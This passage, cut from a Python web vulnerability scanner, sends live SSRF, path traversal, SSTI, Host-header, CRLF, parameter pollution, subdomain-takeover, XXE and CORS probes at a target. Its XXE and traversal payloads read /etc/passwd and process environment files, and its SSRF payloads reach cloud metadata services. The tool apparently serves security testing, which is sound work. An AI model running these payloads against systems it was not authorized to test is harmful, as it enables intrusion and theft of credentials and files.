                                        break
                            except Exception:
                                continue

                except httpx.RequestError as e:
                    logger.debug(f"BOLA test request failed for {url}: {e}")
                except Exception as e:
                    logger.debug(f"BOLA test error for {url}: {e}")

        return findings

    async def _test_ssrf(self) -> List[Finding]:
        """
        Test for Server-Side Request Forgery (SSRF) vulnerabilities.

        Tests:
        1. URL parameters that might fetch external resources
        2. Cloud metadata access attempts
        3. Internal network scanning via SSRF
        """
        findings = []
        self._log_tool("ssrf-test", "running")

        # Find parameters that might be vulnerable to SSRF
        ssrf_param_patterns = [
            r'[?&](url|uri|path|dest|redirect|link|src|source|target|file|document|folder|page|host|site|html)=',
            r'[?&](fetch|load|request|proxy|callback|next|return|continue|goto|reference)=',
        ]

        # Collect URLs with potential SSRF parameters
        ssrf_candidates = []
        for endpoint in self.discovered_endpoints:
            for pattern in ssrf_param_patterns:
                if re.search(pattern, endpoint, re.IGNORECASE):
                    ssrf_candidates.append(endpoint)
                    break

        # Also check form parameters
        for form in self.discovered_forms:
            for inp in form.get('inputs', []):
                name = inp.get('name', '').lower()
                if any(kw in name for kw in ['url', 'uri', 'path', 'src', 'link', 'fetch', 'proxy', 'redirect']):
                    ssrf_candidates.append({
                        'type': 'form',
                        'action': form.get('action', self.target),
                        'method': form.get('method', 'GET'),
                        'param': inp.get('name'),
                    })

        if not ssrf_candidates:
            logger.info("No potential SSRF parameters found")
            return findings

        logger.info(f"Testing {len(ssrf_candidates)} potential SSRF injection points")

        # Get auth headers
        auth_headers = await self._get_auth_headers()

        # SSRF test payloads - use a subset for efficiency
        test_payloads = [
            # Cloud metadata (most impactful)
            ("http://169.254.169.254/latest/meta-data/", "aws_metadata"),
            ("http://metadata.google.internal/computeMetadata/v1/", "gcp_metadata"),
            # Localhost
            ("http://127.0.0.1:80/", "localhost"),
            ("http://localhost/", "localhost"),
            # Internal network
            ("http://192.168.1.1/", "internal_network"),
            ("http://10.0.0.1/", "internal_network"),
        ]

        # Indicators of SSRF success
        ssrf_indicators = [
            "ami-",  # AWS metadata
            "instance-id",  # Cloud metadata
            "computeMetadata",  # GCP
            "<!DOCTYPE",  # Got HTML from internal service
            "<html",
            "Apache",
            "nginx",
        ]

        async with httpx.AsyncClient(timeout=5.0, verify=False, follow_redirects=False) as client:
            for candidate in ssrf_candidates[:15]:  # Limit testing
                for payload, payload_type in test_payloads[:3]:  # Test top 3 payloads
                    try:
                        if isinstance(candidate, dict):
                            # Form-based SSRF
                            url = candidate['action']
                            data = {candidate['param']: payload}
                            if candidate['method'].upper() == 'POST':
                                response = await client.post(url, data=data, headers=auth_headers)
                            else:
                                response = await client.get(url, params=data, headers=auth_headers)
                        else:
                            # URL parameter-based SSRF
                            # Replace the parameter value with payload
                            test_url = re.sub(
                                r'([?&](url|uri|path|dest|redirect|link|src|source|target|file|fetch|load)=)[^&]*',
                                lambda m: m.group(1) + payload,
                                candidate,
                                flags=re.IGNORECASE
                            )
                            response = await client.get(test_url, headers=auth_headers)

                        # Check for SSRF indicators
                        response_text = response.text[:2000]
                        for indicator in ssrf_indicators:
                            if indicator.lower() in response_text.lower():
                                target_url = candidate if isinstance(candidate, str) else candidate['action']
                                findings.append(Finding(
                                    type="ssrf_vulnerability",
                                    value=f"SSRF: {payload_type} access possible",
                                    description=f"Server-Side Request Forgery vulnerability detected. "
                                               f"The server fetched {payload} and returned content containing '{indicator}'.",
                                    severity="critical" if "metadata" in payload_type else "high",
                                    phase="exploit",
                                    tool="ssrf-test",
                                    target=target_url,
                                    metadata={
                                        "payload": payload,
                                        "payload_type": payload_type,
                                        "indicator": indicator,
                                        "response_preview": response_text[:200],
                                    }
                                ))
                                # Found SSRF, no need to test more payloads on this endpoint
                                break

                    except httpx.RequestError:
                        continue
                    except Exception as e:
                        logger.debug(f"SSRF test error: {e}")
                        continue

        return findings

    async def _test_path_traversal(self) -> List[Finding]:
        """
        Test for Path Traversal / Local File Inclusion (LFI) vulnerabilities.

        Tests discovered parameters for directory traversal attacks.
        """
        findings = []
        self._log_tool("lfi-test", "running")

        # Find parameters that might be vulnerable to LFI
        lfi_param_patterns = [
            r'[?&](file|path|page|document|folder|root|dir|include|inc|require|location|template|doc|pdf)=',
            r'[?&](content|load|read|view|display|show|download|filename|name|src|source)=',
        ]

        # Collect URLs with potential LFI parameters
        lfi_candidates = []
        for endpoint in self.discovered_endpoints:
            for pattern in lfi_param_patterns:
                if re.search(pattern, endpoint, re.IGNORECASE):
                    lfi_candidates.append(endpoint)
                    break

        # Also check form parameters
        for form in self.discovered_forms:
            for inp in form.get('inputs', []):
                name = inp.get('name', '').lower()
                if any(kw in name for kw in ['file', 'path', 'page', 'include', 'template', 'doc', 'load']):
                    lfi_candidates.append({
                        'type': 'form',
                        'action': form.get('action', self.target),
                        'method': form.get('method', 'GET'),
                        'param': inp.get('name'),
                    })

        if not lfi_candidates:
            logger.info("No potential LFI parameters found")
            return findings

        logger.info(f"Testing {len(lfi_candidates)} potential LFI injection points")

        # Get auth headers
        auth_headers = await self._get_auth_headers()

        # LFI indicators
        lfi_indicators = {
            "root:": "linux_passwd",
            "daemon:": "linux_passwd",
            "[boot loader]": "windows_ini",
            "[extensions]": "windows_ini",
            "localhost": "hosts_file",
            "PATH=": "environ",
        }

        # Get a subset of payloads
        test_payloads = list(PathTraversalPayloads.linux(depth=8))[:10]
        test_payloads.extend(list(PathTraversalPayloads.encoded())[:5])

        async with httpx.AsyncClient(timeout=5.0, verify=False, follow_redirects=True) as client:
            for candidate in lfi_candidates[:10]:  # Limit testing
                for payload in test_payloads[:5]:  # Test top 5 payloads per endpoint
                    try:
                        if isinstance(candidate, dict):
                            url = candidate['action']
                            data = {candidate['param']: payload}
                            if candidate['method'].upper() == 'POST':
                                response = await client.post(url, data=data, headers=auth_headers)
                            else:
                                response = await client.get(url, params=data, headers=auth_headers)
                        else:
                            # Replace parameter value with payload
                            test_url = re.sub(
                                r'([?&](file|path|page|document|include|template|doc|load|content)=)[^&]*',
                                lambda m: m.group(1) + payload,
                                candidate,
                                flags=re.IGNORECASE
                            )
                            response = await client.get(test_url, headers=auth_headers)

                        # Check for LFI indicators
                        response_text = response.text
                        for indicator, indicator_type in lfi_indicators.items():
                            if indicator in response_text:
                                target_url = candidate if isinstance(candidate, str) else candidate['action']
                                findings.append(Finding(
                                    type="lfi_vulnerability",
                                    value=f"LFI: {indicator_type} file exposed",
                                    description=f"Local File Inclusion vulnerability detected. "
                                               f"The server returned file contents containing '{indicator}'.",
                                    severity="critical",
                                    phase="exploit",
                                    tool="lfi-test",
                                    target=target_url,
                                    metadata={
                                        "payload": payload,
                                        "indicator": indicator,
                                        "indicator_type": indicator_type,
                                    }
                                ))
                                break  # Found LFI, move to next endpoint

                    except httpx.RequestError:
                        continue
                    except Exception as e:
                        logger.debug(f"LFI test error: {e}")
                        continue

        return findings

    async def _test_template_injection(self) -> List[Finding]:
        """
        Test for Server-Side Template Injection (SSTI) vulnerabilities.

        Tests discovered parameters for template injection attacks.
        """
        findings = []
        self._log_tool("ssti-test", "running")

        # Find parameters that might be vulnerable to SSTI
        ssti_param_patterns = [
            r'[?&](template|name|message|text|content|title|subject|body|preview|render|format)=',
            r'[?&](email|greeting|user|username|display|output|msg|comment)=',
        ]

        # Collect candidates
        ssti_candidates = []
        for endpoint in self.discovered_endpoints:
            for pattern in ssti_param_patterns:
                if re.search(pattern, endpoint, re.IGNORECASE):
                    ssti_candidates.append(endpoint)
                    break

        # Also check form parameters
        for form in self.discovered_forms:
            for inp in form.get('inputs', []):
                name = inp.get('name', '').lower()
                if any(kw in name for kw in ['name', 'message', 'text', 'content', 'title', 'template', 'email']):
                    ssti_candidates.append({
                        'type': 'form',
                        'action': form.get('action', self.target),
                        'method': form.get('method', 'GET'),
                        'param': inp.get('name'),
                    })

        if not ssti_candidates:
            logger.info("No potential SSTI parameters found")
            return findings

        logger.info(f"Testing {len(ssti_candidates)} potential SSTI injection points")

        # Get auth headers
        auth_headers = await self._get_auth_headers()

        # SSTI detection payloads with expected results
        detection_payloads = [
            ("{{7*7}}", "49"),           # Jinja2, Twig
            ("${7*7}", "49"),             # Freemarker, Velocity
            ("#{7*7}", "49"),             # Thymeleaf
            ("<%= 7*7 %>", "49"),         # ERB
            ("{{7*'7'}}", "7777777"),     # Jinja2 string multiplication
        ]

        async with httpx.AsyncClient(timeout=5.0, verify=False, follow_redirects=True) as client:
            for candidate in ssti_candidates[:10]:  # Limit testing
                for payload, expected in detection_payloads:
                    try:
                        if isinstance(candidate, dict):
                            url = candidate['action']
                            data = {candidate['param']: payload}
                            if candidate['method'].upper() == 'POST':
                                response = await client.post(url, data=data, headers=auth_headers)
                            else:
                                response = await client.get(url, params=data, headers=auth_headers)
                        else:
                            # Replace parameter value with payload
                            test_url = re.sub(
                                r'([?&](template|name|message|text|content|title|email)=)[^&]*',
                                lambda m: m.group(1) + payload,
                                candidate,
                                flags=re.IGNORECASE
                            )
                            response = await client.get(test_url, headers=auth_headers)

                        # Check if template was executed (expected result appears)
                        if expected in response.text and payload not in response.text:
                            # Template executed - found SSTI!
                            target_url = candidate if isinstance(candidate, str) else candidate['action']
                            template_engine = self._detect_template_engine(payload)
                            findings.append(Finding(
                                type="ssti_vulnerability",
                                value=f"SSTI: {template_engine} template injection",
                                description=f"Server-Side Template Injection detected. "
                                           f"Payload '{payload}' was executed, returning '{expected}'. "
                                           f"This may lead to Remote Code Execution.",
                                severity="critical",
                                phase="exploit",
                                tool="ssti-test",
                                target=target_url,
                                metadata={
                                    "payload": payload,
                                    "expected": expected,
                                    "template_engine": template_engine,
                                }
                            ))
                            break  # Found SSTI, move to next endpoint

                    except httpx.RequestError:
                        continue
                    except Exception as e:
                        logger.debug(f"SSTI test error: {e}")
                        continue

        return findings

    def _detect_template_engine(self, payload: str) -> str:
        """Detect template engine from successful payload."""
        if "{{" in payload and "}}" in payload:
            return "Jinja2/Twig"
        elif "${" in payload:
            return "Freemarker/Velocity"
        elif "#{" in payload:
            return "Thymeleaf"
        elif "<%" in payload:
            return "ERB/JSP"
        return "Unknown"

    async def _test_host_header_injection(self) -> List[Finding]:
        """
        Test for Host Header Injection vulnerabilities.

        Attack vectors:
        - Password reset poisoning (change Host to attacker domain)
        - Web cache poisoning via Host header
        - SSRF via X-Forwarded-Host
        - Routing-based SSRF
        """
        findings = []
        self._log_tool("host-header-injection", "running")

        # Host header injection payloads
        host_payloads = [
            # Direct Host override
            {"Host": "evil.com"},
            {"Host": f"{self.domain}.evil.com"},
            {"Host": "localhost"},
            {"Host": "127.0.0.1"},

            # X-Forwarded-Host (common in proxies)
            {"X-Forwarded-Host": "evil.com"},
            {"X-Forwarded-Host": "localhost"},

            # X-Host variations
            {"X-Host": "evil.com"},
            {"X-Original-Host": "evil.com"},
            {"X-Forwarded-Server": "evil.com"},

            # Double Host header
            {"Host": "evil.com", "X-Forwarded-Host": self.domain},

            # Port injection
            {"Host": f"{self.domain}:evil.com"},
            {"Host": f"{self.domain}@evil.com"},
        ]

        # Test endpoints likely to use Host header
        test_urls = [
            f"{self.target}",
            f"{self.target}/password/reset",
            f"{self.target}/forgot-password",
            f"{self.target}/reset-password",
            f"{self.target}/api/password/reset",
        ]

        auth_headers = await self._get_auth_headers()

        async with httpx.AsyncClient(timeout=10.0, verify=False, follow_redirects=False) as client:
            for url in test_urls[:3]:  # Limit URLs
                for payload_headers in host_payloads[:6]:  # Limit payloads
                    try:
                        # Merge with auth headers
                        headers = {**auth_headers, **payload_headers}

                        response = await client.get(url, headers=headers)

                        # Check for Host header reflection in response
                        injected_host = list(payload_headers.values())[0]
                        response_text = response.text.lower()

                        # Indicators of successful injection
                        if any([
                            injected_host.lower() in response_text,
                            injected_host.lower() in response.headers.get("location", "").lower(),
                            "evil.com" in response_text,
                        ]):
                            findings.append(Finding(
                                type="host_header_injection",
                                value="Host Header Injection Detected",
                                description=f"The application reflects the injected Host header '{injected_host}'. "
                                           f"This can lead to password reset poisoning, cache poisoning, or SSRF.",
                                severity="high",
                                phase="exploit",
                                tool="host-header-injection",
                                target=url,
                                metadata={
                                    "injected_header": payload_headers,
                                    "reflected_in": "response_body" if injected_host.lower() in response_text else "location_header",
                                }
                            ))
                            break  # Found vulnerability, move to next URL

                    except httpx.RequestError:
                        continue
                    except Exception as e:
                        logger.debug(f"Host header test error: {e}")

        return findings

    async def _test_crlf_injection(self) -> List[Finding]:
        """
        Test for CRLF Injection vulnerabilities.

        Attack vectors:
        - HTTP Response Splitting
        - Header Injection
        - Log Poisoning
        - XSS via header injection
        """
        findings = []
        self._log_tool("crlf-injection", "running")

        # CRLF payloads
        crlf_payloads = [
            # Basic CRLF
            "%0d%0aSet-Cookie:crlf=injection",
            "%0d%0aX-Injected:header",
            "\r\nX-Injected: header",

            # Double encoding
            "%250d%250aSet-Cookie:crlf=injection",

            # Mixed encoding
            "%0d%0a%0d%0a<script>alert(1)</script>",
            "%0d%0aLocation:https://evil.com",

            # Unicode variants
            "%E5%98%8A%E5%98%8DSet-Cookie:crlf=injection",

            # Header injection for XSS
            "%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>",
        ]

        # Find parameters to test
        test_params = []
        for endpoint in self.discovered_endpoints:
            if '?' in endpoint and '=' in endpoint:
                test_params.append(endpoint)

        # Also test redirect parameters specifically
        redirect_patterns = ['redirect', 'url', 'next', 'return', 'goto', 'location']
        for endpoint in self.discovered_endpoints:
            for pattern in redirect_patterns:
                if pattern in endpoint.lower():
                    if endpoint not in test_params:
                        test_params.append(endpoint)

        if not test_params:
            # Test root URL with common redirect params
            test_params = [
                f"{self.target}?redirect=test",
                f"{self.target}?url=test",
                f"{self.target}?next=test",
            ]

        auth_headers = await self._get_auth_headers()

        async with httpx.AsyncClient(timeout=5.0, verify=False, follow_redirects=False) as client:
            for endpoint in test_params[:10]:
                for payload in crlf_payloads[:5]:
                    try:
                        # Inject payload into URL parameter
                        test_url = re.sub(r'=([^&]*)', f'=\\1{payload}', endpoint)

                        response = await client.get(test_url, headers=auth_headers)

                        # Check for CRLF indicators
                        # 1. Injected header appears in response headers
                        if "x-injected" in [h.lower() for h in response.headers.keys()]:
                            findings.append(Finding(
                                type="crlf_injection",
                                value="CRLF Injection - Header Injection",
                                description=f"CRLF injection allows arbitrary header injection. "
                                           f"Payload: {payload}",
                                severity="high",
                                phase="exploit",
                                tool="crlf-injection",
                                target=endpoint,
                                metadata={"payload": payload, "type": "header_injection"}
                            ))
                            break

                        # 2. Set-Cookie appears (cookie injection)
                        if "crlf=injection" in response.headers.get("set-cookie", ""):
                            findings.append(Finding(
                                type="crlf_injection",
                                value="CRLF Injection - Cookie Injection",
                                description=f"CRLF injection allows cookie injection. "
                                           f"Payload: {payload}",
                                severity="high",
                                phase="exploit",
                                tool="crlf-injection",
                                target=endpoint,
                                metadata={"payload": payload, "type": "cookie_injection"}
                            ))
                            break

                        # 3. Response splitting (script in body from header area)
                        if "<script>" in response.text and "alert" in response.text:
                            findings.append(Finding(
                                type="crlf_injection",
                                value="CRLF Injection - HTTP Response Splitting",
                                description=f"CRLF injection leads to HTTP response splitting and XSS. "
                                           f"Payload: {payload}",
                                severity="critical",
                                phase="exploit",
                                tool="crlf-injection",
                                target=endpoint,
                                metadata={"payload": payload, "type": "response_splitting"}
                            ))
                            break

                    except httpx.RequestError:
                        continue
                    except Exception as e:
                        logger.debug(f"CRLF test error: {e}")

        return findings

    async def _test_http_parameter_pollution(self) -> List[Finding]:
        """
        Test for HTTP Parameter Pollution (HPP) vulnerabilities.

        Attack vectors:
        - WAF bypass via duplicate parameters
        - Logic bypass (first vs last parameter wins)
        - Price manipulation
        - Access control bypass
        """
        findings = []
        self._log_tool("hpp-test", "running")

        # Find endpoints with parameters to test
        test_endpoints = []
        for endpoint in self.discovered_endpoints:
            if '?' in endpoint and '=' in endpoint:
                test_endpoints.append(endpoint)

        if not test_endpoints:
            logger.info("No parameterized endpoints for HPP testing")
            return findings

        auth_headers = await self._get_auth_headers()

        async with httpx.AsyncClient(timeout=5.0, verify=False, follow_redirects=True) as client:
            for endpoint in test_endpoints[:15]:
                try:
                    # Parse the URL to get parameters
                    from urllib.parse import urlparse, parse_qs, urlencode

                    parsed = urlparse(endpoint)
                    params = parse_qs(parsed.query)

                    if not params:
                        continue

                    # Get baseline response
                    baseline_response = await client.get(endpoint, headers=auth_headers)
                    baseline_length = len(baseline_response.text)
                    baseline_status = baseline_response.status_code

                    # Test HPP for each parameter
                    for param_name, param_values in params.items():
                        # Test 1: Duplicate parameter with different value
                        hpp_url = f"{endpoint}&{param_name}=HPP_TEST_VALUE"

                        hpp_response = await client.get(hpp_url, headers=auth_headers)

                        # Check for HPP indicators
                        hpp_indicators = []

                        # Different response length might indicate different processing
                        if abs(len(hpp_response.text) - baseline_length) > 100:
                            hpp_indicators.append("response_length_changed")

                        # HPP test value reflected (shows which param is used)
                        if "HPP_TEST_VALUE" in hpp_response.text:
                            hpp_indicators.append("duplicate_param_reflected")

                        # Different status code
                        if hpp_response.status_code != baseline_status:
                            hpp_indicators.append("status_code_changed")

                        if hpp_indicators:
                            findings.append(Finding(
                                type="http_parameter_pollution",
                                value=f"HPP: Parameter '{param_name}' may be vulnerable",
                                description=f"HTTP Parameter Pollution detected on parameter '{param_name}'. "
                                           f"Indicators: {', '.join(hpp_indicators)}. "
                                           f"This may allow WAF bypass or logic manipulation.",
                                severity="medium",
                                phase="exploit",
                                tool="hpp-test",
                                target=endpoint,
                                metadata={
                                    "parameter": param_name,
                                    "indicators": hpp_indicators,
                                    "baseline_length": baseline_length,
                                    "hpp_length": len(hpp_response.text),
                                }
                            ))
                            break  # Found HPP on this endpoint, move to next

                except httpx.RequestError:
                    continue
                except Exception as e:
                    logger.debug(f"HPP test error: {e}")

        return findings

    async def _test_subdomain_takeover(self) -> List[Finding]:
        """
        Test for Subdomain Takeover vulnerabilities.

        Checks discovered subdomains for dangling DNS records pointing to
        unclaimed cloud services (AWS, Azure, GitHub, Heroku, etc.).
        """
        findings = []
        self._log_tool("subdomain-takeover", "running")

        # Subdomain takeover fingerprints (service -> error message)
        takeover_fingerprints = {
            # Cloud Platforms
            "AWS S3": ["NoSuchBucket", "The specified bucket does not exist"],
            "AWS CloudFront": ["Bad Request: ERROR: The request could not be satisfied"],
            "Azure": ["404 Web Site not found", "azure-dns.com"],
            "GitHub Pages": ["There isn't a GitHub Pages site here", "For root URLs (like http://example.com/)"],
            "Heroku": ["No such app", "herokucdn.com/error-pages/no-such-app.html"],
            "Shopify": ["Sorry, this shop is currently unavailable"],
            "Tumblr": ["There's nothing here", "tumblr.com"],
            "WordPress": ["Do you want to register", "wordpress.com"],
            "Ghost": ["The thing you were looking for is no longer here"],
            "Pantheon": ["The gods are wise", "404 error unknown site!"],
            "Zendesk": ["Help Center Closed", "zendesk.com"],
            "Fastly": ["Fastly error: unknown domain"],
            "Surge.sh": ["project not found"],
            "Bitbucket": ["Repository not found"],
            "Netlify": ["Not found - Request ID"],
            "Fly.io": ["404 Not Found", "fly.io"],
            "Vercel": ["The deployment could not be found"],
        }

        # Get subdomains to test
        subdomains_to_test = self.subdomains[:50]  # Limit to 50

        if not subdomains_to_test:
            logger.info("No subdomains discovered for takeover testing")
            return findings

        logger.info(f"Testing {len(subdomains_to_test)} subdomains for takeover")

        async with httpx.AsyncClient(timeout=10.0, verify=False, follow_redirects=True) as client:
            for subdomain in subdomains_to_test:
                try:
                    # Ensure proper URL format
                    if not subdomain.startswith("http"):
                        test_url = f"https://{subdomain}"
                    else:
                        test_url = subdomain

                    response = await client.get(test_url)
                    response_text = response.text

                    # Check for takeover fingerprints
                    for service, fingerprints in takeover_fingerprints.items():
                        for fingerprint in fingerprints:
                            if fingerprint.lower() in response_text.lower():
                                findings.append(Finding(
                                    type="subdomain_takeover",
                                    value=f"Subdomain Takeover: {service}",
                                    description=f"Subdomain '{subdomain}' appears vulnerable to takeover. "
                                               f"The DNS points to {service} but the resource is unclaimed. "
                                               f"An attacker could claim this resource and serve malicious content.",
                                    severity="critical",
                                    phase="exploit",
                                    tool="subdomain-takeover",
                                    target=subdomain,
                                    metadata={
                                        "service": service,
                                        "fingerprint": fingerprint,
                                        "status_code": response.status_code,
                                    }
                                ))
                                break  # Found, move to next subdomain

                except httpx.RequestError as e:
                    # Connection errors might also indicate dangling DNS
                    if "Name or service not known" in str(e) or "NXDOMAIN" in str(e):
                        # DNS doesn't resolve - not vulnerable
                        pass
                    elif "Connection refused" in str(e):
                        # Service not running - potential takeover
                        findings.append(Finding(
                            type="subdomain_takeover",
                            value="Potential Subdomain Takeover (Connection Refused)",
                            description=f"Subdomain '{subdomain}' has DNS but service is not responding. "
                                       f"This may indicate a dangling record.",
                            severity="medium",
                            phase="exploit",
                            tool="subdomain-takeover",
                            target=subdomain,
                            metadata={"error": str(e)}
                        ))
                except Exception as e:
                    logger.debug(f"Subdomain takeover test error for {subdomain}: {e}")

        return findings

    async def _test_xxe(self) -> List[Finding]:
        """
        Test for XML External Entity (XXE) Injection vulnerabilities.

        Tests endpoints that accept XML data for:
        - File disclosure via SYSTEM entities
        - SSRF via external entity references
        - Blind XXE via out-of-band channels
        """
        findings = []
        self._log_tool("xxe-injection", "running")

        # XXE detection payloads (safe - don't exfiltrate data)
        detection_payloads = [
            # Entity expansion test
            ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe "XXE_VULN_DETECTED">]><root>&xxe;</root>',
             "XXE_VULN_DETECTED", "basic_entity"),
            # Parameter entity test
            ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % test "PARAM_ENTITY_WORKS">]><root>test</root>',
             "PARAM_ENTITY", "param_entity"),
        ]

        # File disclosure payloads (for confirmed vulnerable endpoints)
        file_payloads = [
            ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
             ["root:", "nobody:", "/bin/bash", "/bin/sh"], "etc_passwd"),
            ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>',
             None, "etc_hostname"),  # Any response indicates success
            ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><root>&xxe;</root>',
             ["PATH=", "HOME=", "USER="], "proc_environ"),
            # Windows
            ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><root>&xxe;</root>',
             ["[fonts]", "[extensions]", "MAPI="], "win_ini"),
        ]

        # SSRF via XXE payloads
        ssrf_payloads = [
            ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
             ["ami-id", "instance-id", "local-ipv4"], "aws_metadata"),
            ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">]><root>&xxe;</root>',
             ["project", "instance"], "gcp_metadata"),
        ]

        # Content-Types that might accept XML
        xml_content_types = [
            "application/xml",
            "text/xml",
            "application/xhtml+xml",
            "application/soap+xml",
            "application/rss+xml",
            "application/atom+xml",
        ]

        # Test discovered endpoints that might accept XML
        endpoints_to_test = []

        # Check forms that might accept XML
        for form in self.discovered_forms[:20]:
            endpoints_to_test.append(form.get("action", self.target))

        # Add common XML endpoints
        common_xml_endpoints = [
            "/api/xml", "/api/v1/xml", "/soap", "/wsdl",
            "/xmlrpc.php", "/xmlrpc", "/rss", "/feed",
            "/api/import", "/import", "/upload",
            "/api/config", "/config.xml",
        ]
        for endpoint in common_xml_endpoints:
            full_url = f"{self.target.rstrip('/')}{endpoint}"
            endpoints_to_test.append(full_url)

        # Deduplicate
        endpoints_to_test = list(set(endpoints_to_test))[:30]

        logger.info(f"Testing {len(endpoints_to_test)} endpoints for XXE")

        async with httpx.AsyncClient(timeout=15.0, verify=False, follow_redirects=True) as client:
            for endpoint in endpoints_to_test:
                for content_type in xml_content_types[:2]:  # Test with first 2 content types
                    # Phase 1: Detection
                    for payload, marker, payload_name in detection_payloads:
                        try:
                            headers = {
                                "Content-Type": content_type,
                                "Accept": "application/xml, text/xml, */*",
                            }

                            response = await client.post(
                                endpoint,
                                content=payload,
                                headers=headers
                            )

                            response_text = response.text

                            # Check if entity was expanded
                            if marker and marker in response_text:
                                logger.info(f"XXE detection successful at {endpoint}")

                                # Phase 2: Attempt file disclosure
                                for file_payload, file_markers, file_name in file_payloads:
                                    try:
                                        file_response = await client.post(
                                            endpoint,
                                            content=file_payload,
                                            headers=headers
                                        )
                                        file_text = file_response.text

                                        # Check for file content
                                        file_found = False
                                        if file_markers:
                                            file_found = any(m in file_text for m in file_markers)
                                        elif len(file_text) > 50:  # Generic response check
                                            file_found = True

                                        if file_found:
                                            findings.append(Finding(
                                                type="xxe_file_disclosure",
                                                value=f"XXE File Disclosure: {file_name}",
                                                description=f"XML External Entity injection allows reading local files. "
                                                           f"Endpoint '{endpoint}' is vulnerable to XXE attacks. "
                                                           f"Attacker can read sensitive files like /etc/passwd, config files, etc.",
                                                severity="critical",
                                                phase="exploit",
                                                tool="xxe-injection",
                                                target=endpoint,
                                                metadata={
                                                    "payload_type": file_name,
                                                    "content_type": content_type,
                                                    "response_preview": file_text[:500] if file_text else None,
                                                }
                                            ))
                                            break  # Found file disclosure, don't need more

                                    except Exception:
                                        continue

                                # Phase 3: Test SSRF via XXE
                                for ssrf_payload, ssrf_markers, ssrf_name in ssrf_payloads:
                                    try:
                                        ssrf_response = await client.post(
                                            endpoint,
                                            content=ssrf_payload,
                                            headers=headers
                                        )
                                        ssrf_text = ssrf_response.text

                                        if any(m in ssrf_text for m in ssrf_markers):
                                            findings.append(Finding(
                                                type="xxe_ssrf",
                                                value=f"XXE SSRF: {ssrf_name}",
                                                description=f"XXE can be used for Server-Side Request Forgery. "
                                                           f"Attacker can access internal services and cloud metadata.",
                                                severity="critical",
                                                phase="exploit",
                                                tool="xxe-injection",
                                                target=endpoint,
                                                metadata={
                                                    "ssrf_type": ssrf_name,
                                                    "content_type": content_type,
                                                }
                                            ))
                                            break

                                    except Exception:
                                        continue

                                # If we found vulnerability, no need to test more content types
                                break

                        except httpx.RequestError:
                            continue
                        except Exception as e:
                            logger.debug(f"XXE test error at {endpoint}: {e}")

        return findings

    async def _test_cors_misconfiguration(self) -> List[Finding]:
        """
        Test for CORS (Cross-Origin Resource Sharing) misconfigurations.

        Checks for:
        - Wildcard origins (Access-Control-Allow-Origin: *)
        - Null origin acceptance
        - Arbitrary origin reflection
        - Credentials with permissive origins
        """
        findings = []
        self._log_tool("cors-test", "running")

        # Test origins
        test_origins = [
            "https://evil.com",
            "https://attacker.com",
            "null",  # null origin attack
            f"https://{self.domain}.evil.com",  # subdomain confusion
            f"https://evil{self.domain}",  # prefix attack
            "https://localhost",
            "https://127.0.0.1",
        ]

        # Endpoints to test
        endpoints_to_test = [self.target]

        # Add discovered API endpoints
        for endpoint in self.discovered_endpoints[:20]:
            if "/api" in endpoint.lower() or endpoint.endswith(".json"):
                endpoints_to_test.append(endpoint)

        # Common API paths
        api_paths = [
            "/api", "/api/v1", "/api/v2", "/graphql",
            "/rest", "/data", "/ajax", "/json",
            "/api/user", "/api/users", "/api/config",
        ]
        for path in api_paths:
            endpoints_to_test.append(f"{self.target.rstrip('/')}{path}")

        endpoints_to_test = list(set(endpoints_to_test))[:25]

        logger.info(f"Testing {len(endpoints_to_test)} endpoints for CORS misconfiguration")

        async with httpx.AsyncClient(timeout=10.0, verify=False, follow_redirects=True) as client:
            for endpoint in endpoints_to_test:
                for origin in test_origins:
                    try:
                        # Send OPTIONS preflight request
                        headers = {
                            "Origin": origin,
                            "Access-Control-Request-Method": "GET",
                            "Access-Control-Request-Headers": "X-Requested-With",
                        }

                        # Try OPTIONS first (preflight)
                        try:
                            options_response = await client.options(endpoint, headers=headers)
                            acao = options_response.headers.get("Access-Control-Allow-Origin", "")
                            acac = options_response.headers.get("Access-Control-Allow-Credentials", "")
                        except Exception:
                            acao = ""
                            acac = ""

                        # Also try GET with Origin header
                        get_headers = {"Origin": origin}
                        get_response = await client.get(endpoint, headers=get_headers)

                        # Check response headers
                        if not acao:
                            acao = get_response.headers.get("Access-Control-Allow-Origin", "")
                        if not acac:
                            acac = get_response.headers.get("Access-Control-Allow-Credentials", "")

                        # Analyze CORS configuration
                        vuln_type = None
                        severity = None
                        description = None

                        # Check for wildcard with credentials (CRITICAL)
                        if acao == "*" and acac.lower() == "true":
                            vuln_type = "cors_wildcard_credentials"
                            severity = "critical"
                            description = (
                                f"CORS allows ANY origin with credentials! "
                                f"Access-Control-Allow-Origin: * combined with "
                                f"Access-Control-Allow-Credentials: true allows any website "
                                f"to make authenticated requests and steal user data."
                            )

                        # Check for origin reflection (HIGH)
                        elif acao == origin and origin not in ("null",):
                            if acac.lower() == "true":
                                vuln_type = "cors_origin_reflection_credentials"
                                severity = "high"
                                description = (
                                    f"CORS reflects arbitrary origins with credentials! "
                                    f"The server echoes back the Origin header ({origin}) "
                                    f"with Access-Control-Allow-Credentials: true. "
                                    f"Attacker can steal authenticated user data."
                                )
                            else:
                                vuln_type = "cors_origin_reflection"
                                severity = "medium"
                                description = (
                                    f"CORS reflects arbitrary origins. "
                                    f"Server echoes Origin: {origin} in ACAO header. "
                                    f"May allow cross-origin data access."
                                )

                        # Check for null origin acceptance (HIGH)
                        elif origin == "null" and acao == "null":
                            vuln_type = "cors_null_origin"
                            severity = "high"
                            description = (
                                f"CORS accepts 'null' origin! "
                                f"Attackers can use sandboxed iframes or data: URLs "
                                f"to send requests with null origin and bypass CORS."
                            )

                        # Check for wildcard (MEDIUM - unless with credentials)
                        elif acao == "*":
